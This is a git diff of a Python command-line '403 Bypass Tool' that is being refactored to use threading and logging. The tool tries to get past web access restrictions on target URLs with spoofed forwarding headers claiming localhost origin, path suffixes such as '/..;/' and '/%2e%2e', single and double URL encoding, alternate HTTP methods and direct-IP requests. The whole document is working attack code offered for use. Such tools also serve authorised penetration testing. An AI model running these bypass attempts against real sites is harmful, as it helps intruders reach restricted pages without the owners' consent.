@@ -1,14 +1,18 @@
+import argparse
+import logging
+import random
+import socket
+import sys
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import quote, urlparse
 import requests
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
-import random
-import threading
-from urllib.parse import quote, urlparse
-import socket
-import argparse
-import sys
 
-# List of User-Agents
+# Set up logging
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
+# User-Agent list for random selection
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
@@ -16,7 +20,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
 ]
 
-# Advanced Headers for 403 Bypass
+# Headers and path modifications for 403 bypass attempts
 HEADERS_LIST = [
     {'X-Forwarded-For': '127.0.0.1'},
     {'X-Original-URL': '/'},
@@ -25,19 +29,8 @@ HEADERS_LIST = [
     {'X-Originating-IP': '127.0.0.1'},
     {'User-Agent': random.choice(USER_AGENTS)},
 ]
-
-# Common HTTP Methods to try
 HTTP_METHODS = ['GET', 'POST', 'OPTIONS', 'HEAD']
-
-# Path modifications to try
-PATH_MODS = [
-    '/',
-    '/.',
-    '/..',
-    '/..;/',
-    '/%2e',
-    '/%2e%2e',
-]
+PATH_MODS = ['/', '/.', '/..', '/..;/', '/%2e', '/%2e%2e']
 
 def setup_session():
     session = requests.Session()
@@ -46,8 +39,19 @@ def setup_session():
     session.mount("https://", HTTPAdapter(max_retries=retries))
     return session
 
-def attempt_bypass(url, session):
-    print(f"\n[*] Testing bypass techniques on: {url}")
+def attempt_bypass(url, session, payload):
+    try:
+        response = session.get(url, headers={"User-Agent": payload})
+        if response.status_code == 200:
+            logging.info(f"Bypass successful for {url} with payload {payload}")
+            return response.text
+        else:
+            logging.info(f"Attempted {url} with payload {payload}: {response.status_code}")
+    except Exception as e:
+        logging.error(f"Error accessing {url}: {str(e)}")
+
+def advanced_bypass(url, session):
+    logging.info(f"Testing advanced bypass techniques on: {url}")
     results = []
 
     # Try different headers
@@ -55,13 +59,12 @@ def attempt_bypass(url, session):
         response = session.get(url, headers=headers)
         results.append((headers, response.status_code))
     
-    # Try encoding just the path, not the full URL
+    # Try encoded paths
     parsed_url = urlparse(url)
     base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
     encoded_path = quote(parsed_url.path)
     double_encoded_path = quote(encoded_path)
     
-    # Make requests with encoded paths
     for encoded in [encoded_path, double_encoded_path]:
         encoded_url = f"{base_url}{encoded}"
         response = session.get(encoded_url)
@@ -72,69 +75,38 @@ def attempt_bypass(url, session):
         modified_url = f"{base_url}{parsed_url.path}{path_mod}"
         response = session.get(modified_url)
         results.append(({'Path Modification': path_mod}, response.status_code))
-
+    
     # Try different HTTP methods
     for method in HTTP_METHODS:
         response = session.request(method, url)
         results.append(({'method': method}, response.status_code))
-    
-    return results
 
-def try_ip_access(url, session):
-    # Resolve domain to IP and try direct IP access if 403 persists
+    # Attempt IP-based access
     try:
-        parsed_url = urlparse(url)
         ip = socket.gethostbyname(parsed_url.hostname)
         ip_url = f"{parsed_url.scheme}://{ip}{parsed_url.path}"
         response = session.get(ip_url)
-        return {'IP Access': ip, 'Status Code': response.status_code}
+        results.append(({'IP Access': ip}, response.status_code))
     except Exception as e:
-        print(f"[!] IP resolution failed: {e}")
-        return None
+        logging.error(f"IP resolution failed: {e}")
 
-def display_results(results):
-    print("\n[+] Bypass Results:")
     for attempt, status in results:
-        print(f"Attempt: {attempt} | Status Code: {status}")
+        logging.info(f"Attempt: {attempt} | Status Code: {status}")
         if status not in [403, 404]:
-            print("Possible bypass achieved!")
-
-def process_url(url, session):
-    results = attempt_bypass(url, session)
-    ip_result = try_ip_access(url, session)
-    if ip_result:
-        results.append(ip_result)
-    display_results(results)
+            logging.info("Possible bypass achieved!")
 
 def main():
-    parser = argparse.ArgumentParser(description="403 Bypass Tool")
-    parser.add_argument("-u", "--url", help="Single URL to bypass 403 restrictions", type=str)
-    parser.add_argument("-f", "--file", help="File containing URLs to test", type=str)
-
+    parser = argparse.ArgumentParser(description="Advanced 403 Bypass Tool")
+    parser.add_argument("urls", nargs='+', help="List of URLs to test")
+    parser.add_argument("--payloads", nargs='+', help="Custom payloads to use", default=USER_AGENTS)
     args = parser.parse_args()
 
-    if not args.url and not args.file:
-        print("Please provide a URL with -u or a file with -f. Use -h for help.")
-        sys.exit(1)
-
     session = setup_session()
-
-    # Single URL mode
-    if args.url:
-        process_url(args.url, session)
-
-    # File input mode
-    if args.file:
-        try:
-            with open(args.file, 'r') as file:
-                urls = file.readlines()
-                for url in urls:
-                    url = url.strip()
-                    if url:
-                        process_url(url, session)
-        except FileNotFoundError:
-            print(f"[!] Error: File '{args.file}' not found.")
-            sys.exit(1)
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        for url in args.urls:
+            for payload in args.payloads:
+                executor.submit(attempt_bypass, url, session, payload)
+            executor.submit(advanced_bypass, url, session)
 
 if __name__ == "__main__":
     main()
